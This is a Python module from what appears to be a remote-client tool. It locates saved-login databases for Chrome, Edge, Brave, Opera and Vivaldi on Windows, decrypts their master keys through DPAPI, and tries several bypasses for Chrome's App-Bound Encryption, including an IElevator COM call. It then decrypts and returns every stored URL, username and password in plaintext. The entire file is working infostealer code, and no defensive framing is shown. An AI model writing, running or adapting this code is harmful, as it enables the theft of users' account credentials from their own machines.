"""
Password Extractor for Chromium-based browsers.

Extracts and decrypts saved passwords from:
- Google Chrome
- Microsoft Edge
- Brave Browser
- Opera / Opera GX
- Vivaldi
- Other Chromium-based browsers

Supports:
- Standard DPAPI encryption (Chrome < 127)
- App-Bound Encryption v20 (Chrome 127+)

For Chrome 127+ ABE:
- CDP cannot be used for passwords (Chrome doesn't expose them)
- Must decrypt the ABE key and then decrypt passwords from Login Data
"""
from __future__ import annotations

import base64
import json
import logging
import os
import shutil
import sqlite3
import tempfile
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Optional

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

logger = logging.getLogger(__name__)

# Browser configurations for password extraction
BROWSER_PASSWORD_CONFIG = {
    "chrome": {
        "name": "Google Chrome",
        "login_data_paths": [
            Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data",
        ],
        "local_state": Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data" / "Local State",
    },
    "edge": {
        "name": "Microsoft Edge",
        "login_data_paths": [
            Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft" / "Edge" / "User Data" / "Default" / "Login Data",
        ],
        "local_state": Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft" / "Edge" / "User Data" / "Local State",
    },
    "brave": {
        "name": "Brave Browser",
        "login_data_paths": [
            Path(os.environ.get("LOCALAPPDATA", "")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Login Data",
        ],
        "local_state": Path(os.environ.get("LOCALAPPDATA", "")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Local State",
    },
    "opera": {
        "name": "Opera",
        "login_data_paths": [
            Path(os.environ.get("APPDATA", "")) / "Opera Software" / "Opera Stable" / "Login Data",
        ],
        "local_state": Path(os.environ.get("APPDATA", "")) / "Opera Software" / "Opera Stable" / "Local State",
    },
    "opera_gx": {
        "name": "Opera GX",
        "login_data_paths": [
            Path(os.environ.get("APPDATA", "")) / "Opera Software" / "Opera GX Stable" / "Login Data",
        ],
        "local_state": Path(os.environ.get("APPDATA", "")) / "Opera Software" / "Opera GX Stable" / "Local State",
    },
    "vivaldi": {
        "name": "Vivaldi",
        "login_data_paths": [
            Path(os.environ.get("LOCALAPPDATA", "")) / "Vivaldi" / "User Data" / "Default" / "Login Data",
        ],
        "local_state": Path(os.environ.get("LOCALAPPDATA", "")) / "Vivaldi" / "User Data" / "Local State",
    },
}


@dataclass
class ExtractedPassword:
    """Represents an extracted password."""
    browser: str
    url: str
    username: str
    password: str
    date_created: int = 0
    date_last_used: int = 0
    times_used: int = 0


class PasswordDecryptionError(Exception):
    """Raised when password decryption fails."""
    pass


def _copy_db(db_path: Path) -> Optional[Path]:
    """Copy database to temp file to avoid locking issues."""
    try:
        handle = tempfile.NamedTemporaryFile(prefix="rc_pwd_", suffix=".db", delete=False)
        temp_path = Path(handle.name)
        handle.close()
        shutil.copyfile(db_path, temp_path)
        return temp_path
    except Exception as e:
        logger.debug(f"Failed to copy database: {e}")
        return None


def _get_dpapi():
    """Get DPAPI module (Windows only)."""
    if os.name != "nt":
        return None
    try:
        import win32crypt
        return win32crypt
    except ImportError:
        return None


def _load_encryption_key(local_state_path: Path) -> Optional[bytes]:
    """
    Load and decrypt the encryption key from Local State.
    
    Handles both standard DPAPI and App-Bound Encryption (ABE) keys.
    """
    if not local_state_path.exists():
        return None
    
    try:
        raw = local_state_path.read_text(encoding="utf-8")
        data = json.loads(raw)
        encrypted_key_b64 = data.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key_b64:
            return None
        encrypted_key = base64.b64decode(encrypted_key_b64)
    except Exception as e:
        logger.debug(f"Failed to read Local State: {e}")
        return None
    
    dpapi = _get_dpapi()
    if not dpapi:
        logger.warning("DPAPI not available (pywin32 not installed)")
        return None
    
    # Check if ABE (App-Bound Encryption) key
    if encrypted_key.startswith(b"APPB"):
        return _decrypt_abe_key(encrypted_key, dpapi)
    
    # Standard DPAPI key
    if encrypted_key.startswith(b"DPAPI"):
        encrypted_key = encrypted_key[5:]
    
    try:
        key = dpapi.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key
    except Exception as e:
        logger.debug(f"DPAPI key decryption failed: {e}")
        return None


def _decrypt_abe_key(encrypted_key: bytes, dpapi) -> Optional[bytes]:
    """
    Decrypt an App-Bound Encryption (ABE) key.
    
    Chrome 127+ uses ABE which binds the key to the Chrome application.
    This is more complex to decrypt than standard DPAPI.
    """
    # Remove APPB prefix
    key_data = encrypted_key[4:]
    
    # Method 1: Direct DPAPI (works on some configurations)
    try:
        decrypted = dpapi.CryptUnprotectData(key_data, None, None, None, 0)[1]
        if decrypted and len(decrypted) >= 16:
            logger.info("ABE key decrypted via direct DPAPI")
            return decrypted
    except Exception as e:
        logger.debug(f"Direct DPAPI decryption of ABE key failed: {e}")
    
    # Method 2: Try with CRYPTPROTECT_UI_FORBIDDEN flag
    try:
        CRYPTPROTECT_UI_FORBIDDEN = 0x01
        decrypted = dpapi.CryptUnprotectData(key_data, None, None, None, CRYPTPROTECT_UI_FORBIDDEN)[1]
        if decrypted and len(decrypted) >= 16:
            logger.info("ABE key decrypted via DPAPI (UI_FORBIDDEN)")
            return decrypted
    except Exception:
        pass
    
    # Method 3: Try with LOCAL_MACHINE flag
    try:
        CRYPTPROTECT_LOCAL_MACHINE = 0x04
        decrypted = dpapi.CryptUnprotectData(key_data, None, None, None, CRYPTPROTECT_LOCAL_MACHINE)[1]
        if decrypted and len(decrypted) >= 16:
            logger.info("ABE key decrypted via DPAPI (LOCAL_MACHINE)")
            return decrypted
    except Exception:
        pass
    
    # Method 4: Try decrypting full key with APPB prefix
    try:
        decrypted = dpapi.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        if decrypted and len(decrypted) >= 16:
            logger.info("ABE key decrypted via full key DPAPI")
            return decrypted
    except Exception:
        pass
    
    # Method 5: Try IElevator COM interface
    try:
        from remote_client.cookie_extractor.app_bound_encryption import _try_ielevator_com_decrypt
        result = _try_ielevator_com_decrypt(encrypted_key)
        if result:
            logger.info("ABE key decrypted via IElevator COM")
            return result
    except ImportError:
        pass
    except Exception as e:
        logger.debug(f"IElevator COM decryption failed: {e}")
    
    logger.warning("Failed to decrypt ABE key - all methods failed")
    return None


def _decrypt_password(encrypted_value: bytes, key: Optional[bytes], dpapi) -> str:
    """
    Decrypt a password value.
    
    Supports v10/v11/v12/v20 encrypted values.
    """
    if not encrypted_value:
        return ""
    
    # v10/v11/v12/v20: AES-GCM encryption
    if encrypted_value[:3] in (b"v10", b"v11", b"v12", b"v20"):
        if not key:
            return "[key_unavailable]"
        
        try:
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:]
            aesgcm = AESGCM(key)
            plaintext = aesgcm.decrypt(nonce, ciphertext, None)
            return plaintext.decode("utf-8", errors="replace")
        except Exception as e:
            logger.debug(f"AES-GCM decryption failed: {e}")
            return "[decrypt_failed]"
    
    # Legacy: Direct DPAPI encryption
    if dpapi:
        try:
            decrypted = dpapi.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
            return decrypted.decode("utf-8", errors="replace")
        except Exception as e:
            logger.debug(f"DPAPI password decryption failed: {e}")
    
    return "[decrypt_failed]"


class PasswordExtractor:
    """
    Extracts and decrypts passwords from Chromium-based browsers.
    
    Usage:
        extractor = PasswordExtractor()
        passwords = extractor.extract("chrome")
        
        # Or extract from all browsers
        all_passwords = extractor.extract_all()
    """
    
    def __init__(self):
        self._dpapi = _get_dpapi()
        self._key_cache: dict[str, Optional[bytes]] = {}
    
    def _get_key(self, browser: str) -> Optional[bytes]:
        """Get or load encryption key for browser."""
        if browser in self._key_cache:
            return self._key_cache[browser]
        
        config = BROWSER_PASSWORD_CONFIG.get(browser)
        if not config:
            return None
        
        local_state = config.get("local_state")
        if not local_state or not local_state.exists():
            self._key_cache[browser] = None
            return None
        
        key = _load_encryption_key(local_state)
        self._key_cache[browser] = key
        return key
    
    def extract(self, browser: str) -> list[ExtractedPassword]:
        """
        Extract passwords from a specific browser.
        
        Args:
            browser: Browser ID (chrome, edge, brave, opera, etc.)
            
        Returns:
            List of ExtractedPassword objects
        """
        config = BROWSER_PASSWORD_CONFIG.get(browser)
        if not config:
            logger.warning(f"Unknown browser: {browser}")
            return []
        
        key = self._get_key(browser)
        passwords: list[ExtractedPassword] = []
        
        for login_data_path in config.get("login_data_paths", []):
            if not login_data_path.exists():
                continue
            
            temp_db = _copy_db(login_data_path)
            if not temp_db:
                continue
            
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # Query passwords
                cursor.execute("""
                    SELECT origin_url, username_value, password_value, 
                           date_created, date_last_used, times_used
                    FROM logins
                    WHERE blacklisted_by_user = 0
                """)
                
                for row in cursor.fetchall():
                    url, username, encrypted_password, date_created, date_last_used, times_used = row
                    
                    if not encrypted_password:
                        continue
                    
                    password = _decrypt_password(
                        bytes(encrypted_password) if encrypted_password else b"",
                        key,
                        self._dpapi
                    )
                    
                    passwords.append(ExtractedPassword(
                        browser=browser,
                        url=url or "",
                        username=username or "",
                        password=password,
                        date_created=date_created or 0,
                        date_last_used=date_last_used or 0,
                        times_used=times_used or 0,
                    ))
                
                conn.close()
                
            except Exception as e:
                logger.debug(f"Error reading {browser} Login Data: {e}")
            finally:
                try:
                    temp_db.unlink(missing_ok=True)
                except Exception:
                    pass
        
        # Log statistics
        total = len(passwords)
        decrypted = sum(1 for p in passwords if not p.password.startswith("["))
        logger.info(f"{browser}: {decrypted}/{total} passwords decrypted")
        
        return passwords
    
    def extract_all(self) -> dict[str, list[ExtractedPassword]]:
        """
        Extract passwords from all configured browsers.
        
        Returns:
            Dictionary mapping browser names to password lists
        """
        results = {}
        for browser in BROWSER_PASSWORD_CONFIG:
            passwords = self.extract(browser)
            if passwords:
                results[browser] = passwords
        return results
    
    def get_available_browsers(self) -> list[dict]:
        """List browsers with available Login Data."""
        available = []
        for browser, config in BROWSER_PASSWORD_CONFIG.items():
            for path in config.get("login_data_paths", []):
                if path.exists():
                    available.append({
                        "id": browser,
                        "name": config["name"],
                        "path": str(path),
                    })
                    break
        return available


def extract_passwords(browser: str) -> list[dict]:
    """
    Extract passwords from a browser and return as dictionaries.
    
    Convenience function for simple usage.
    """
    extractor = PasswordExtractor()
    passwords = extractor.extract(browser)
    return [
        {
            "browser": p.browser,
            "url": p.url,
            "username": p.username,
            "password": p.password,
            "date_created": p.date_created,
            "date_last_used": p.date_last_used,
            "times_used": p.times_used,
        }
        for p in passwords
    ]


def extract_all_browser_passwords() -> dict[str, list[dict]]:
    """
    Extract passwords from all browsers.
    
    Returns dictionary mapping browser names to password lists.
    """
    extractor = PasswordExtractor()
    results = extractor.extract_all()
    return {
        browser: [
            {
                "browser": p.browser,
                "url": p.url,
                "username": p.username,
                "password": p.password,
                "date_created": p.date_created,
                "date_last_used": p.date_last_used,
                "times_used": p.times_used,
            }
            for p in passwords
        ]
        for browser, passwords in results.items()
    }


def get_password_decryption_status() -> dict[str, Any]:
    """
    Get status information about password decryption capabilities.
    
    Returns:
        Dictionary with status information for each browser
    """
    status = {
        "dpapi_available": _get_dpapi() is not None,
        "browsers": {},
    }
    
    for browser, config in BROWSER_PASSWORD_CONFIG.items():
        browser_status = {
            "name": config["name"],
            "login_data_found": False,
            "local_state_found": False,
            "key_available": False,
            "abe_detected": False,
            "password_count": 0,
        }
        
        # Check Login Data
        for path in config.get("login_data_paths", []):
            if path.exists():
                browser_status["login_data_found"] = True
                # Count passwords
                temp_db = _copy_db(path)
                if temp_db:
                    try:
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT COUNT(*) FROM logins WHERE blacklisted_by_user = 0")
                        browser_status["password_count"] = cursor.fetchone()[0]
                        conn.close()
                    except Exception:
                        pass
                    finally:
                        try:
                            temp_db.unlink(missing_ok=True)
                        except Exception:
                            pass
                break
        
        # Check Local State
        local_state = config.get("local_state")
        if local_state and local_state.exists():
            browser_status["local_state_found"] = True
            
            # Check for ABE
            try:
                raw = local_state.read_text(encoding="utf-8")
                data = json.loads(raw)
                encrypted_key_b64 = data.get("os_crypt", {}).get("encrypted_key", "")
                encrypted_key = base64.b64decode(encrypted_key_b64)
                browser_status["abe_detected"] = encrypted_key.startswith(b"APPB")
            except Exception:
                pass
            
            # Try to load key
            key = _load_encryption_key(local_state)
            browser_status["key_available"] = key is not None
        
        status["browsers"][browser] = browser_status
    
    return status
